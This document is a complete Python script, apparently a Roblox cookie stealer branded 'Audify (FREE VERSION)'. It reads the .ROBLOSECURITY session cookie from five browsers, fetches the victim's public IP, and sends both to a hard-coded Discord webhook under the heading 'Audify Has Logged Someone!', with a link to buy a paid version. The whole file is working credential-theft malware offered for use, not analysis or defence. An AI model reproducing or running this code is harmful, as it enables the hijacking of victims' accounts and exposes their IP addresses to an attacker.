import os
import requests
from discordwebhook import Discord
import browser_cookie3

# Your webhook URL (consider keeping it in environment variables for security)
webhook = os.getenv("DISCORD_WEBHOOK_URL", "https://discordapp.com/api/webhooks/1347684752035151992/SsaJBwp-kUf5EYsSOGtOU_SlFl7UtJRbTm0dw3CM5hvj7uMcZ1Uytu1VYEg0XOFOJqou")

def get_public_ip():
    try:
        ip = requests.get("https://api.ipify.org").text
        return ip
    except requests.RequestException as e:
        print(f"Failed to get IP address: {e}")
        return "IP Fetch Failed"

def extract_roblox_cookie():
    # List of browser cookie extractors
    browsers = [browser_cookie3.firefox, browser_cookie3.chrome, browser_cookie3.chromium, browser_cookie3.edge, browser_cookie3.opera]
    
    for browser in browsers:
        try:
            cookies = browser(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.value
        except Exception as e:
            print(f"Error with {browser.__name__}: {e}")
    
    return None

def main():
    roblox_cookie = extract_roblox_cookie()

    if roblox_cookie is None:
        roblox_cookie = "No Roblox Cookie Found"
    
    ip = get_public_ip()

    discord = Discord(url=webhook)
    discord.post(
        username="BOT - Audify (FREE VERSION) 🍪",
        avatar_url="https://media.discordapp.net/attachments/1090956626330144868/1091777808243622038/133-1332078_the-openui5-icon-comes-in-2-flavors-black.png?width=576&height=580g",
        embeds=[
            {
                "username": "BOT - Audify (FREE VERSION) 🍪",
                "title": "Press Here To Buy Paid Version",
                "author": {
                    "name": "Audify Has Logged Someone!",
                    "icon_url": "https://cdn-icons-png.flaticon.com/512/5968/5968968.png",
                },
                "url": "https://discord.gg/h8TGb3xDje",
                "description": "",
                "color": 16711680,
                "fields": [
                    {"name": "Roblox Cookie", "value": f"```{roblox_cookie}```", "inline": False},
                    {"name": "IP Address", "value": f"**`{ip}`**", "inline": False},
                ],
                "thumbnail": {
                    "url": "https://media.discordapp.net/attachments/1090955582413996064/1092084616434827294/pcmkNdRdBGCDPaN.png?width=772&height=579"
                }
            },
        ],
    )

if __name__ == "__main__":
    main()
